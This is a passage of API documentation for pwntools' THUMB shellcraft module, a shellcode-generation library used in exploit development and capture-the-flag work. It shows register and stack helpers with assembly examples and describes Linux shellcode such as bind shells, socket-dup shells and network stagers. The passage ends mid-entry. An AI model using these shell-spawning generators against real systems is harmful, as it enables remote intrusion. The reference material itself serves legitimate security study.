</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.mov">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">mov</code><span class="sig-paren">(</span><em>dst</em>, <em>src</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/mov.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.mov" title="Permalink to this definition">¶</a></dt>
<dd><blockquote>
<div><p>Returns THUMB code for moving the specified source value
into the specified destination register.</p>
<p>If src is a string that is not a register, then it will locally set
<cite>context.arch</cite> to <cite>&#8216;thumb&#8217;</cite> and use <code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> to evaluate the
string. Note that this means that this shellcode can change behavior depending
on the value of <cite>context.os</cite>.</p>
</div></blockquote>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span><span class="s1">&#39;r2&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, r2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    eor r1, r1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #0xa + 1</span>
<span class="go">    sub r1, r1, 1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #0x11</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;r1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* moving r1 into r1, but this is a no-op */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mi">512</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #0x200</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mh">0x10000001</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #(0x10000001 &gt;&gt; 28)</span>
<span class="go">    lsl r1, #28</span>
<span class="go">    add r1, #(0x10000001 &amp; 0xff)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mh">0xdead0000</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #(0xdead0000 &gt;&gt; 25)</span>
<span class="go">    lsl r1, #(25 - 16)</span>
<span class="go">    add r1, #((0xdead0000 &gt;&gt; 16) &amp; 0xff)</span>
<span class="go">    lsl r1, #16</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="mh">0xdead00ff</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    ldr r1, value_...</span>
<span class="go">    b value_..._after</span>
<span class="go">value_...: .word 0xdead00ff</span>
<span class="go">value_..._after:</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #SYS_execve /* 0xb */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #SYS_execve /* 0x3b */</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">mov</span><span class="p">(</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;PROT_READ | PROT_WRITE | PROT_EXEC&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r1, #(PROT_READ | PROT_WRITE | PROT_EXEC) /* 7 */</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.nop">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">nop</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/nop.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.nop" title="Permalink to this definition">¶</a></dt>
<dd><p>A nop instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.popad">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">popad</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/popad.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.popad" title="Permalink to this definition">¶</a></dt>
<dd><p>Pop all of the registers onto the stack which i386 popad does,
in the same order.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.push">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">push</code><span class="sig-paren">(</span><em>value</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/push.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.push" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a value onto the stack without using
null bytes or newline characters.</p>
<p>If src is a string, then we try to evaluate with <cite>context.arch = &#8216;thumb&#8217;</cite> using
<code class="xref py py-func docutils literal"><span class="pre">pwnlib.constants.eval()</span></code> before determining how to push it. Note that this
means that this shellcode can change behavior depending on the value of
<cite>context.os</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>value</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The value or register to push</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;r0&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    push {r0}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 0 */</span>
<span class="go">    eor r7, r7</span>
<span class="go">    push {r7}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 1 */</span>
<span class="go">    mov r7, #1</span>
<span class="go">    push {r7}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push 256 */</span>
<span class="go">    mov r7, #0x100</span>
<span class="go">    push {r7}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;SYS_execve&#39; */</span>
<span class="go">    mov r7, #0xb</span>
<span class="go">    push {r7}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;SYS_execve&#39; */</span>
<span class="go">    mov r7, #0x3b</span>
<span class="go">    push {r7}</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.pushad">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">pushad</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/pushad.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.pushad" title="Permalink to this definition">¶</a></dt>
<dd><p>Push all of the registers onto the stack which i386 pushad does,
in the same order.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.pushstr">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em>, <em>register='r7'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack without using
null bytes or newline characters.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>Examples:</p>
<p>Note that this doctest has two possibilities for the first result, depending
on your version of binutils.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;Hello</span><span class="se">\n</span><span class="s1">World!&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)))</span> <span class="ow">in</span> <span class="p">[</span>
<span class="gp">... </span><span class="s1">&#39;87ea070780b4dff8047001e0726c642180b4dff8047001e06f0a576f80b4dff8047001e048656c6c80b4&#39;</span><span class="p">,</span>
<span class="gp">... </span><span class="s1">&#39;87ea070780b4dff8067000f002b8726c642180b4dff8047000f002b86f0a576f80b4014f00f002b848656c6c80b4&#39;</span><span class="p">]</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span> 
<span class="go">    /* push &#39;abc\x00&#39; */</span>
<span class="go">    ldr r7, value_...</span>
<span class="go">    b value_..._after</span>
<span class="go">value_...: .word 0xff636261</span>
<span class="go">value_..._after:</span>
<span class="go">    lsl r7, #8</span>
<span class="go">    lsr r7, #8</span>
<span class="go">    push {r7}</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">enhex</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)))</span>
<span class="go">87ea070780b4</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.pushstr_array">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">pushstr_array</code><span class="sig-paren">(</span><em>reg</em>, <em>array</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/pushstr_array.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.pushstr_array" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes an array/envp-style array of pointers onto the stack.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Destination register to hold the pointer.</li>
<li><strong>array</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a><em>,</em><a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Single argument or list of arguments to push.
NULL termination is normalized so that each argument
ends with exactly one NULL byte.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.ret">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">ret</code><span class="sig-paren">(</span><em>return_value=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/ret.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.ret" title="Permalink to this definition">¶</a></dt>
<dd><p>A single-byte RET instruction.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>return_value</strong> &#8211; Value to return</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.setregs">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;r0&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;r2&#39;</span><span class="p">:</span><span class="s1">&#39;r3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r0, #1</span>
<span class="go">    mov r2, r3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;r0&#39;</span><span class="p">:</span><span class="s1">&#39;r1&#39;</span><span class="p">,</span> <span class="s1">&#39;r1&#39;</span><span class="p">:</span><span class="s1">&#39;r0&#39;</span><span class="p">,</span> <span class="s1">&#39;r2&#39;</span><span class="p">:</span><span class="s1">&#39;r3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov r2, r3</span>
<span class="go">    eor r0, r0, r1 /* xchg r0, r1 */</span>
<span class="go">    eor r1, r0, r1</span>
<span class="go">    eor r0, r0, r1</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.to_arm">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">to_arm</code><span class="sig-paren">(</span><em>reg=None</em>, <em>avoid=[]</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/to_arm.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.to_arm" title="Permalink to this definition">¶</a></dt>
<dd><p>Go from THUMB to ARM mode.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.trap">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>A trap instruction.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.udiv_10">
<code class="descclassname">pwnlib.shellcraft.thumb.</code><code class="descname">udiv_10</code><span class="sig-paren">(</span><em>N</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/udiv_10.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.udiv_10" title="Permalink to this definition">¶</a></dt>
<dd><p>Divides r0 by 10.  Result is stored in r0, N and Z flags are updated.</p>
<dl class="docutils">
<dt>Code is from generated from here:</dt>
<dd><a class="reference external" href="https://raw.githubusercontent.com/rofirrim/raspberry-pi-assembler/master/chapter15/magic.py">https://raw.githubusercontent.com/rofirrim/raspberry-pi-assembler/master/chapter15/magic.py</a></dd>
<dt>With code:</dt>
<dd>python magic.py 10 code_for_unsigned</dd>
</dl>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.thumb.linux">
<span id="pwnlib-shellcraft-thumb-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.thumb.linux" title="pwnlib.shellcraft.thumb.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.thumb.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.thumb.linux" title="Permalink to this headline">¶</a></h6>
<p>Shellcraft module containing THUMB shellcodes for Linux.</p>
<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.bindsh">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">bindsh</code><span class="sig-paren">(</span><em>port</em>, <em>network</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/bindsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.bindsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Listens on a TCP port and spawns a shell for the first to connect.
Port is the TCP port to listen on, network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.cat">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">mktemp</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s1">&#39;FLAG</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">arm</span><span class="o">.</span><span class="n">to_thumb</span><span class="p">()</span><span class="o">+</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">thumb</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="n">f</span><span class="p">))</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;FLAG\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.connect">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.
Leaves the connected socket in R6.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.connectstager">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">connectstager</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/connectstager.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.connectstager" title="Permalink to this definition">¶</a></dt>
<dd><p>connect recvsize stager
:param host, where to connect to:
:param port, which port to connect to:
:param network, ipv4 or ipv6? (default: ipv4)</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.dup">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">dup</code><span class="sig-paren">(</span><em>sock='r6'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/dup.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.dup" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = r6]
Duplicates sock to stdin, stdout and stderr</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.dupsh">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">dupsh</code><span class="sig-paren">(</span><em>sock='r6'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/dupsh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.dupsh" title="Permalink to this definition">¶</a></dt>
<dd><p>Args: [sock (imm/reg) = ebp]
Duplicates sock to stdin, stdout and stderr and spawns a shell.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.echo">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock='1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s1">&#39;hello</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.thumb.linux.findpeer">
<code class="descclassname">pwnlib.shellcraft.thumb.linux.</code><code class="descname">findpeer</code><span class="sig-paren">(</span><em>port</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/thumb/linux/findpeer.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.thumb.linux.findpeer" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a connected socket. If port is specified it is checked
